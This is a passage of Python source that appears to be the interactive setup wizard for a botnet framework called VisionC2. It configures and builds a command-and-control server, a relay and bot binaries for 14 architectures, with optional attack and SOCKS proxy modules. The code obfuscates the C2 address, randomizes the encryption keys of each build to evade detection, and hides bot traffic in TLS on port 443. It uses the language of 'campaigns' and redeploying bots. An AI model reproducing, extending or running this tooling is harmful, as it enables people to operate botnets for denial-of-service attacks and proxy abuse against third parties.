        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}                                                              {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}  {Colors.BRIGHT_GREEN}[1]{Colors.RESET} {Colors.BRIGHT_WHITE}Full Setup{Colors.RESET}                                           {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.GREEN}├─{Colors.RESET} New C2 address (IP or domain)                     {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.GREEN}├─{Colors.RESET} Generate new magic code & protocol version        {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.GREEN}├─{Colors.RESET} Generate new TLS certificates                     {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.GREEN}└─{Colors.RESET} Build CNC server & bot binaries                   {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.DIM}Best for: Fresh install, new campaign{Colors.RESET}                {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}                                                              {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}  {Colors.BRIGHT_YELLOW}[2]{Colors.RESET} {Colors.BRIGHT_WHITE}C2 URL Update Only{Colors.RESET}                                   {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.YELLOW}├─{Colors.RESET} Change C2 domain or IP address                    {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.YELLOW}├─{Colors.RESET} Keep existing magic code & certificates           {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.YELLOW}└─{Colors.RESET} Rebuild bot binaries only                         {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.DIM}Best for: Server migration, domain change{Colors.RESET}            {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}                                                              {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}  {Colors.BRIGHT_MAGENTA}[3]{Colors.RESET} {Colors.BRIGHT_WHITE}Module Update & Rebuild{Colors.RESET}                               {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.MAGENTA}├─{Colors.RESET} Enable or disable attacks / SOCKS modules          {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.MAGENTA}├─{Colors.RESET} Keep existing C2, magic code & certificates        {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.MAGENTA}└─{Colors.RESET} Rebuild bot binaries with new module flags         {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.DIM}Best for: Switching between full/atk-only/socks-only{Colors.RESET}    {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}                                                              {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}  {Colors.BRIGHT_GREEN}[4]{Colors.RESET} {Colors.BRIGHT_WHITE}Restore from setup_config.txt{Colors.RESET}                        {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.GREEN}├─{Colors.RESET} Re-apply saved C2, tokens, proxy & module flags   {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.GREEN}├─{Colors.RESET} Generates fresh AES key, re-encrypts blobs        {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.GREEN}└─{Colors.RESET} Rebuild all binaries                               {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.DIM}Best for: After git pull, want old campaign back{Colors.RESET}        {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}                                                              {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}  {Colors.BRIGHT_RED}[0]{Colors.RESET} Exit                                                  {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}                                                              {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}╚══════════════════════════════════════════════════════════════╝{Colors.RESET}"
    )

    # Print quick feature summary
    print(
        f"\n{Colors.DIM}  📡 Supports: Direct IP, Domain (A record), or TXT record C2{Colors.RESET}"
    )
    print(f"{Colors.DIM}  🔒 Bot→C2 encrypted via TLS 1.3 on port 443{Colors.RESET}")
    print(
        f"{Colors.DIM}  🏗️  Builds for 14 architectures (x86, ARM, MIPS, etc.){Colors.RESET}\n"
    )

    choice = prompt("Select option", "1")
    return choice


def run_full_setup(base_path: str, cnc_path: str, bot_path: str):
    """Run full setup - everything new"""
    config = {}

    # Debug Mode Configuration (before main setup)
    debug_enabled = prompt_debug_mode()
    config["debug_mode"] = debug_enabled

    if debug_enabled:
        warning("Debug mode ENABLED - remember to disable for production!")
    else:
        success("Debug mode disabled - ready for production")
    print()

    # Bot Module Selection
    cap_attacks, cap_socks = prompt_capabilities()
    config["cap_attacks"] = cap_attacks
    config["cap_socks"] = cap_socks
    print()

    # Step 1: C2 Address
    print_step(1, 5, "C2 Server Configuration")

    print(
        f"{Colors.DIM}   Enter IP or domain (no http:// prefix). Supports direct IP, A record, or TXT record.{Colors.RESET}"
    )
    print(
        f"{Colors.DIM}   Examples: 192.168.1.100 | c2.example.com | lookup.mydomain.com{Colors.RESET}\n"
    )

    c2_ip = prompt("What is your C2 server IP or domain?", "127.0.0.1")
    c2_address = f"{c2_ip}:443"
    config["c2_address"] = c2_address

    admin_port = prompt("What port would you like for admin CLI?", "420")
    config["admin_port"] = admin_port

    print()
    success(f"C2: {c2_address} | Admin port: {admin_port}")

    info("Relay endpoints are managed at runtime via the CNC dashboard — add/remove without rebuilding")

    # Default SOCKS5 proxy credentials — auto-generated, unique per build
    _chars = string.ascii_letters + string.digits
    proxy_user = "".join(random.choice(_chars) for _ in range(12))
    proxy_pass = "".join(random.choice(_chars) for _ in range(12))
    config["proxy_user"] = proxy_user
    config["proxy_pass"] = proxy_pass
    success(f"Proxy auth (auto-generated): {proxy_user}:{proxy_pass}")

    # Step 2: Security Tokens & AES Key
    print_step(2, 5, "Security Token & Key Generation")

    magic_code = generate_magic_code(16)
    protocol_version = generate_protocol_version()
    crypt_seed = generate_crypt_seed()

    success(f"Magic: {magic_code}")
    success(f"Protocol: {protocol_version}")
    success(f"Crypt seed: {crypt_seed}")

    config["magic_code"] = magic_code
    config["protocol_version"] = protocol_version
    config["crypt_seed"] = crypt_seed

    # Generate random per-build AES key BEFORE C2 obfuscation
    # so derive_key_py and aes_ctr_encrypt use the new key
    info("Generating per-build AES encryption key...")
    opsec_path = os.path.join(bot_path, "opsec.go")
    config_go_path = os.path.join(bot_path, "config.go")
    crypto_path = os.path.join(base_path, "tools", "crypto.go")
    old_key = read_current_key(opsec_path)
    new_key, new_pairs = generate_random_key()
    # Patch opsec.go first so garuda_key() returns the new key
    patch_opsec_key(opsec_path, new_pairs)
    if os.path.exists(crypto_path):
        patch_crypto_tool_key(crypto_path, new_pairs)
    success(f"AES key randomized ({new_key.hex()[:16]}...)")

    # Re-encrypt existing blobs (except rawServiceAddr, which gets patched below)
    encrypt_config_blobs(config_go_path, old_key, new_key)
    success("Sensitive string blobs re-encrypted")

    # Obfuscate C2 (now uses the NEW key via garuda_key() / derive_key_py())
    info("Applying multi-layer obfuscation...")
    obfuscated_c2 = obfuscate_c2(c2_address, crypt_seed)
    config["obfuscated_c2"] = obfuscated_c2

    if verify_obfuscation(obfuscated_c2, crypt_seed, c2_address):
        success("C2 address obfuscation verified ✓")
    else:
        error("Obfuscation verification failed!")
        sys.exit(1)

    # Step 3: Certificates
    print_step(3, 5, "TLS Certificates")

    print(
        f"{Colors.DIM}   TLS certs are required. You can self-sign here or use Let's Encrypt/your own.{Colors.RESET}"
    )
    print(
        f"{Colors.DIM}   Place your own certs at: cnc/certificates/server.crt and cnc/certificates/server.key{Colors.RESET}\n"
    )

    print(f"  {Colors.BRIGHT_GREEN}[1]{Colors.RESET} Generate self-signed certificates")
    print(
        f"  {Colors.BRIGHT_YELLOW}[2]{Colors.RESET} I'll provide my own (Let's Encrypt, etc.)\n"
    )

    cert_choice = prompt("Select option", "1")

    if cert_choice == "1":
        print(
            f"\n{Colors.DIM}   Enter certificate details (press Enter for defaults):{Colors.RESET}\n"
        )
        cert_config = {
            "country": prompt("Country code (2 letter)", "US"),
            "state": prompt("State/Province", "California"),
            "city": prompt("City", "San Francisco"),
            "org": prompt("Organization", "Security Research"),
            "cn": prompt("Common Name (domain)", c2_ip),
            "days": int(prompt("Valid days", "365")),
        }
        config["cert"] = cert_config

        if not generate_certificates(cnc_path, cert_config):
            error("Certificate generation failed!")
            if not confirm("Would you like to continue anyway?"):
                sys.exit(1)
        else:
            success("Self-signed TLS certificates generated")
    else:
        config["cert"] = {"custom": True}
        warning("Remember to place server.crt and server.key in cnc/ folder")

    # Step 4: Update Source
    print_step(4, 5, "Updating Source Code")

    print(
        f"{Colors.DIM}   Applying your configuration to source files...{Colors.RESET}\n"
    )

    if update_cnc_main_go(cnc_path, magic_code, protocol_version, admin_port):
        success("CNC configured")
    else:
        error("Failed to update CNC")

    update_relay_config(base_path, magic_code)
    success("Relay configured")

    if update_bot_main_go(
        bot_path, magic_code, protocol_version, obfuscated_c2, crypt_seed
    ):
        success("Bot configured")
    else:
        error("Failed to update Bot")

    if update_bot_debug_mode(bot_path, config["debug_mode"]):
        success(f"Debug mode: {'ON' if config['debug_mode'] else 'OFF'}")
    else:
        warning("Failed to set debug mode")

    atk_s = "ON" if config["cap_attacks"] else "OFF"
    socks_s = "ON" if config["cap_socks"] else "OFF"
    success(f"Bot modules: attacks={atk_s}, socks={socks_s}")

    # Relay endpoints are now managed at runtime via the CNC dashboard (cnc/db/relays.json)

    # Update default proxy credentials (bot + CNC)
    update_proxy_credentials(bot_path, config["proxy_user"], config["proxy_pass"])
    update_cnc_proxy_credentials(cnc_path, config["proxy_user"], config["proxy_pass"])
    success(f"Proxy credentials: {config['proxy_user']}:{config['proxy_pass']}")

    # Step 5: Build
    print_step(5, 5, "Building Binaries")

    if confirm("Would you like to build the CNC server?"):
        if build_cnc(cnc_path):
            success("CNC server built")
        else:
            warning("CNC build failed - build manually with: cd cnc && go build")

    if confirm("Would you like to build the relay server?"):
        if build_relay(base_path):
            success("Relay server built")
        else:
            warning("Relay build failed - build manually with: go build -o relay ./cnc/relay")

    if confirm(
        "Would you like to build bot binaries? (14 architectures, takes a few mins)"
    ):
        build_tags = caps_to_build_tags(config["cap_attacks"], config["cap_socks"])
        if build_bots(base_path, build_tags):
            success("Bot binaries built")
        else:
            warning("Bot build had issues - check bins/")

    # Save config
    config_file = save_config(base_path, config)
    info(f"Configuration saved to: {config_file}")

    print_summary(config)


def run_c2_update(base_path: str, cnc_path: str, bot_path: str):
    """Update C2 URL only - keep existing magic code, protocol, certs"""

    # Debug Mode Configuration (before main setup)
    debug_enabled = prompt_debug_mode()

    if debug_enabled:
        warning("Debug mode ENABLED - remember to disable for production!")
    else:
        success("Debug mode disabled - ready for production")
    print()

    # Bot Module Selection
    cap_attacks, cap_socks = prompt_capabilities()
    print()

    # Get existing config
    info("Reading existing configuration...")
    existing = get_current_config(bot_path, cnc_path)

    if not existing.get("magic_code") or not existing.get("crypt_seed"):
        error("Could not read existing configuration!")
        error("Please run Full Setup instead.")
        return

    print()
    info(
        f"Current Magic Code: {Colors.BRIGHT_WHITE}{existing.get('magic_code', 'N/A')}{Colors.RESET}"
    )
    info(
        f"Current Protocol: {Colors.BRIGHT_WHITE}{existing.get('protocol_version', 'N/A')}{Colors.RESET}"
    )
    info(
        f"Current Crypt Seed: {Colors.BRIGHT_WHITE}{existing.get('crypt_seed', 'N/A')}{Colors.RESET}"
    )
    info(
        f"Current Admin Port: {Colors.BRIGHT_WHITE}{existing.get('admin_port', 'N/A')}{Colors.RESET}"
    )
    print()

    config = {}
    config["magic_code"] = existing["magic_code"]
    config["protocol_version"] = existing["protocol_version"]
    config["crypt_seed"] = existing["crypt_seed"]
    config["admin_port"] = existing.get("admin_port", "420")

    # Step 1: New C2 Address
    print_step(1, 2, "New C2 Address")

    print(
        f"{Colors.DIM}   Enter IP or domain (no http:// prefix). Supports direct IP, A record, or TXT record.{Colors.RESET}"
    )
    print(
        f"{Colors.DIM}   Examples: 192.168.1.100 | c2.example.com | lookup.mydomain.com{Colors.RESET}\n"
    )

    c2_ip = prompt("What is your new C2 server IP or domain?")
    if not c2_ip:
        error("C2 address is required!")
        return

    c2_address = f"{c2_ip}:443"
    config["c2_address"] = c2_address

    success(f"New C2: {c2_address}")

    # Step 2: Update & Build
    print_step(2, 2, "Update & Build")

    print(f"{Colors.DIM}   Applying new C2 address and fresh AES key...{Colors.RESET}\n")

    # Generate random AES key FIRST so C2 obfuscation uses the new key
    info("Generating per-build AES encryption key...")
    opsec_path = os.path.join(bot_path, "opsec.go")
    config_go_path = os.path.join(bot_path, "config.go")
    crypto_path = os.path.join(base_path, "tools", "crypto.go")
    old_key = read_current_key(opsec_path)
    new_key, new_pairs = generate_random_key()
    # Patch opsec.go first so garuda_key() returns the new key
    patch_opsec_key(opsec_path, new_pairs)
    if os.path.exists(crypto_path):
        patch_crypto_tool_key(crypto_path, new_pairs)
    success(f"AES key randomized ({new_key.hex()[:16]}...)")

    # Re-encrypt existing blobs with new key
    encrypt_config_blobs(config_go_path, old_key, new_key)
    success("Sensitive string blobs re-encrypted")

    # Obfuscate C2 (now uses the NEW key via garuda_key() / derive_key_py())
    obfuscated_c2 = obfuscate_c2(c2_address, config["crypt_seed"])
    config["obfuscated_c2"] = obfuscated_c2

    if verify_obfuscation(obfuscated_c2, config["crypt_seed"], c2_address):
        success("C2 address obfuscation verified ✓")
    else:
        error("Obfuscation verification failed!")
        sys.exit(1)

    # Update bot source with new C2 and existing tokens
    if update_bot_main_go(
        bot_path,
        config["magic_code"],
        config["protocol_version"],
        obfuscated_c2,
        config["crypt_seed"],
    ):
        success("Bot configured")
    else:
        error("Failed to update Bot")

    update_relay_config(base_path, config["magic_code"])
    success("Relay configured")

    if update_bot_debug_mode(bot_path, debug_enabled):
        success(f"Debug mode: {'ON' if debug_enabled else 'OFF'}")
    else:
        warning("Failed to set debug mode")

    atk_s = "ON" if cap_attacks else "OFF"
    socks_s = "ON" if cap_socks else "OFF"
    success(f"Bot modules: attacks={atk_s}, socks={socks_s}")

    if confirm("Would you like to build the relay server?"):
        if build_relay(base_path):
            success("Relay server built")
        else:
            warning("Relay build failed - build manually with: go build -o relay ./cnc/relay")

    if confirm("Would you like to build bot binaries? (takes a few mins)"):
        build_tags = caps_to_build_tags(cap_attacks, cap_socks)
        if build_bots(base_path, build_tags):
            success("Bot binaries built")
        else:
            warning("Bot build had issues - check bins/")

    # Summary
    print(f"\n{Colors.BRIGHT_GREEN}{'═' * 60}{Colors.RESET}")
    print(
        f"{Colors.BRIGHT_GREEN}{Colors.BOLD}  ✓ C2 URL UPDATE COMPLETE!{Colors.RESET}"
    )
    print(f"{Colors.BRIGHT_GREEN}{'═' * 60}{Colors.RESET}\n")

    print(
        f"  {Colors.YELLOW}New C2 Address:{Colors.RESET}  {Colors.BRIGHT_WHITE}{c2_address}{Colors.RESET}"
    )
    print(
        f"  {Colors.YELLOW}Magic Code:{Colors.RESET}      {Colors.BRIGHT_WHITE}(unchanged){Colors.RESET}"
    )
    print(
        f"  {Colors.YELLOW}Certificates:{Colors.RESET}    {Colors.BRIGHT_WHITE}(unchanged){Colors.RESET}"
    )
    print()
    warning("Deploy new bot binaries from bins/")
    warning("Existing bots will NOT auto-update - redeploy required")
    print()


def run_module_update(base_path: str, cnc_path: str, bot_path: str):
    """Change which modules are compiled into bot binaries and rebuild."""

    print_step(1, 2, "Module Selection")
    cap_attacks, cap_socks = prompt_capabilities()
    print()

    print_step(2, 2, "Build")
    print(f"{Colors.DIM}   C2, magic code, certs — all unchanged.{Colors.RESET}\n")

    if confirm("Would you like to build bot binaries? (14 architectures, takes a few mins)"):
        build_tags = caps_to_build_tags(cap_attacks, cap_socks)
        if build_bots(base_path, build_tags):
            success("Bot binaries built")
        else:
            warning("Bot build had issues - check bins/")
    else:
        atk_s = "ON" if cap_attacks else "OFF"
        socks_s = "ON" if cap_socks else "OFF"
        info(f"Skipped build — to build manually: BOT_BUILD_TAGS={caps_to_build_tags(cap_attacks, cap_socks)} bash tools/build.sh")

    print(f"\n{Colors.BRIGHT_GREEN}{'═' * 60}{Colors.RESET}")
    print(f"{Colors.BRIGHT_GREEN}{Colors.BOLD}  ✓ MODULE UPDATE COMPLETE!{Colors.RESET}")
    print(f"{Colors.BRIGHT_GREEN}{'═' * 60}{Colors.RESET}\n")
    atk_s = "ON" if cap_attacks else "OFF"
    socks_s = "ON" if cap_socks else "OFF"
    print(f"  {Colors.YELLOW}Attacks:{Colors.RESET}      {Colors.BRIGHT_WHITE}{atk_s}{Colors.RESET}")
    print(f"  {Colors.YELLOW}SOCKS:{Colors.RESET}        {Colors.BRIGHT_WHITE}{socks_s}{Colors.RESET}")
    print(f"  {Colors.YELLOW}C2 / Tokens:{Colors.RESET}  {Colors.BRIGHT_WHITE}(unchanged){Colors.RESET}")
    print()
    warning("Deploy new bot binaries from bins/")
    warning("Existing bots will NOT auto-update - redeploy required")
    print()


def parse_setup_config(config_path: str) -> dict:
    """Parse setup_config.txt and return a dict of all saved values."""
    config = {}
    try:
        with open(config_path, "r") as f:
            for line in f:
                line = line.strip()
                if ": " not in line:
                    continue
                key, _, value = line.partition(": ")
                key = key.strip()
                value = value.strip()
                if key == "C2 Address":
                    config["c2_address"] = value
                elif key == "Admin Port":
                    config["admin_port"] = value
                elif key == "Magic Code":
                    config["magic_code"] = value
                elif key == "Protocol Version":
                    config["protocol_version"] = value
                elif key == "Crypt Seed":
                    config["crypt_seed"] = value
                elif key == "Obfuscated C2":
                    config["obfuscated_c2"] = value
                elif key == "Proxy User":
                    config["proxy_user"] = value
                elif key == "Proxy Pass":
                    config["proxy_pass"] = value
                elif key == "Attacks":
                    config["cap_attacks"] = value.lower() == "true"
                elif key == "Socks":
                    config["cap_socks"] = value.lower() == "true"
                elif key == "Country":
                    config.setdefault("cert", {})["country"] = value
                elif key == "State":
                    config.setdefault("cert", {})["state"] = value
                elif key == "City":
                    config.setdefault("cert", {})["city"] = value
                elif key == "Organization":
                    config.setdefault("cert", {})["org"] = value
                elif key == "Common Name":
                    config.setdefault("cert", {})["cn"] = value
                elif key == "Valid Days":
                    config.setdefault("cert", {})["days"] = int(value)
    except Exception as e:
        error(f"Failed to parse setup_config.txt: {e}")
    return config


def run_restore(base_path: str, cnc_path: str, bot_path: str):
    """Restore a previous setup from setup_config.txt — re-patches all source with saved values."""
    config_path = os.path.join(base_path, "setup_config.txt")

    if not os.path.exists(config_path):
        error("setup_config.txt not found in project root.")
        error("Run a Full Setup first to generate it.")
        return

    info(f"Reading saved config from: {config_path}")
    config = parse_setup_config(config_path)

    required = ["c2_address", "admin_port", "magic_code", "protocol_version", "crypt_seed"]
    missing = [k for k in required if not config.get(k)]
    if missing:
        error(f"setup_config.txt is missing required fields: {', '.join(missing)}")
        error("The file may be from an older version that didn't save all fields.")
        return

    print()
    print(f"{Colors.BRIGHT_CYAN}  Restoring from saved config:{Colors.RESET}")
    print(f"  {Colors.YELLOW}C2 Address:{Colors.RESET}       {Colors.BRIGHT_WHITE}{config['c2_address']}{Colors.RESET}")
    print(f"  {Colors.YELLOW}Admin Port:{Colors.RESET}       {Colors.BRIGHT_WHITE}{config['admin_port']}{Colors.RESET}")
    print(f"  {Colors.YELLOW}Magic Code:{Colors.RESET}       {Colors.BRIGHT_WHITE}{config['magic_code']}{Colors.RESET}")
    print(f"  {Colors.YELLOW}Protocol:{Colors.RESET}         {Colors.BRIGHT_WHITE}{config['protocol_version']}{Colors.RESET}")
    print(f"  {Colors.YELLOW}Crypt Seed:{Colors.RESET}       {Colors.BRIGHT_WHITE}{config['crypt_seed']}{Colors.RESET}")
    proxy_u = config.get("proxy_user", "(not saved)")
    proxy_p = config.get("proxy_pass", "(not saved)")
    print(f"  {Colors.YELLOW}Proxy Auth:{Colors.RESET}       {Colors.BRIGHT_WHITE}{proxy_u}:{proxy_p}{Colors.RESET}")
    atk_s = "ON" if config.get("cap_attacks", True) else "OFF"
    socks_s = "ON" if config.get("cap_socks", True) else "OFF"
    print(f"  {Colors.YELLOW}Bot modules:{Colors.RESET}      {Colors.BRIGHT_WHITE}attacks={atk_s}, socks={socks_s}{Colors.RESET}")
    print()

    if not confirm("Apply this config and rebuild?"):
        return

    # Step 1: Fresh AES key (git pull resets opsec.go to repo state)
    print_step(1, 3, "Generating Fresh AES Key")
    opsec_path = os.path.join(bot_path, "opsec.go")
    config_go_path = os.path.join(bot_path, "config.go")
    crypto_path = os.path.join(base_path, "tools", "crypto.go")
    old_key = read_current_key(opsec_path)
    new_key, new_pairs = generate_random_key()
    patch_opsec_key(opsec_path, new_pairs)
    if os.path.exists(crypto_path):
        patch_crypto_tool_key(crypto_path, new_pairs)
    success(f"AES key randomized ({new_key.hex()[:16]}...)")

    # Re-encrypt existing blobs with new key before writing new values
    encrypt_config_blobs(config_go_path, old_key, new_key)
    success("Existing blobs re-encrypted")

    # Step 2: Patch source files
    print_step(2, 3, "Patching Source Files")

    # Re-obfuscate C2 using stored seed + new key
    c2_address = config["c2_address"]
    crypt_seed = config["crypt_seed"]
    obfuscated_c2 = obfuscate_c2(c2_address, crypt_seed)

    if not verify_obfuscation(obfuscated_c2, crypt_seed, c2_address):
        error("C2 obfuscation verification failed!")
        sys.exit(1)
    success("C2 address re-obfuscated and verified ✓")

    if update_cnc_main_go(cnc_path, config["magic_code"], config["protocol_version"], config["admin_port"]):
        success("CNC configured")
    else:
        error("Failed to update CNC")

    update_relay_config(base_path, config["magic_code"])
    success("Relay configured")

    if update_bot_main_go(bot_path, config["magic_code"], config["protocol_version"], obfuscated_c2, crypt_seed):
        success("Bot configured")
    else:
        error("Failed to update Bot")

    if config.get("proxy_user") and config.get("proxy_pass"):
        update_proxy_credentials(bot_path, config["proxy_user"], config["proxy_pass"])
        update_cnc_proxy_credentials(cnc_path, config["proxy_user"], config["proxy_pass"])
        success(f"Proxy credentials restored: {config['proxy_user']}:{config['proxy_pass']}")
    else:
        warning("Proxy credentials not found in setup_config.txt — skipping (run !socksauth to set them)")

    # Step 3: Build
    print_step(3, 3, "Building Binaries")

    if confirm("Would you like to build the CNC server?"):
        if build_cnc(cnc_path):
            success("CNC server built")
        else:
            warning("CNC build failed - build manually with: cd cnc && go build")

    if confirm("Would you like to build the relay server?"):
        if build_relay(base_path):
            success("Relay server built")
        else:
            warning("Relay build failed")

    if confirm("Would you like to build bot binaries? (14 architectures, takes a few mins)"):
        build_tags = caps_to_build_tags(config.get("cap_attacks", True), config.get("cap_socks", True))
        if build_bots(base_path, build_tags):
            success("Bot binaries built")
        else:
            warning("Bot build had issues - check bins/")

    print(f"\n{Colors.BRIGHT_GREEN}{'═' * 60}{Colors.RESET}")
    print(f"{Colors.BRIGHT_GREEN}{Colors.BOLD}  ✓ RESTORE COMPLETE!{Colors.RESET}")
    print(f"{Colors.BRIGHT_GREEN}{'═' * 60}{Colors.RESET}\n")
    print(f"  {Colors.YELLOW}C2 Address:{Colors.RESET}  {Colors.BRIGHT_WHITE}{c2_address}{Colors.RESET}")
    print(f"  {Colors.YELLOW}Magic Code:{Colors.RESET}  {Colors.BRIGHT_WHITE}{config['magic_code']}{Colors.RESET}")
    print()
    warning("Deploy new bot binaries from bins/ — existing bots will NOT auto-update")
    print()


def main():
    """Main setup wizard"""
    print_banner()

    # Get base path
    base_path = os.path.dirname(os.path.abspath(__file__))
    cnc_path = os.path.join(base_path, "cnc")
    bot_path = os.path.join(base_path, "bot")

    # Verify paths exist
    if not os.path.exists(cnc_path) or not os.path.exists(bot_path):
        error("Cannot find cnc/ or bot/ directories. Run this from VisionC2 root.")
        sys.exit(1)

    print(f"{Colors.DIM}Working directory: {base_path}{Colors.RESET}")

    # Show menu
    choice = print_menu()

    if choice == "1":
        info("Starting Full Setup...")
        run_full_setup(base_path, cnc_path, bot_path)
    elif choice == "2":
        info("Starting C2 URL Update...")
        run_c2_update(base_path, cnc_path, bot_path)
    elif choice == "3":
        info("Starting Module Update...")
        run_module_update(base_path, cnc_path, bot_path)
    elif choice == "4":
        info("Restoring from setup_config.txt...")
        run_restore(base_path, cnc_path, bot_path)
    elif choice == "0":
        print("\nExiting.")
        sys.exit(0)
    else:
        error("Invalid option")
        sys.exit(1)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}Setup cancelled by user.{Colors.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}Error: {e}{Colors.RESET}")
        sys.exit(1)
